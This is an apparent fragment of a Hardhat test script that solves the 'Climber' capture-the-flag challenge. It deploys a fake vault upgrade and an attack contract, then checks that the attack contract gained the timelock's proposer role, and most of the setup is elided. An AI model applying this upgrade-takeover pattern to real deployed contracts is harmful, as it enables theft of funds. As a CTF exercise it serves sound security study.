...
describe("[Challenge] Climber", function () {
    ...
    it("Exploit", async function () {
        ...
        //Deploy Fake upgrade
        const climberV2Factory = await ethers.getContractFactory(
            "ClimberVaultV2"
        );
        const climberV2 = await climberV2Factory.deploy();
        console.log(`Fake Upgrade deplyed at ${climberV2.address}`);
        ...
        const attackContract = await attackContractFactory.deploy(...args);
        console.log(`Attack contract deployed at ${attackContract.address}`);

        await attackContract.attack();

        const role = await this.timelock
            .connect(attacker)
            .hasRole(ethers.utils.id("PROPOSER_ROLE"), attackContract.address);
        console.log(`Attacker Contract has proposer Role: ${role}`);
    });
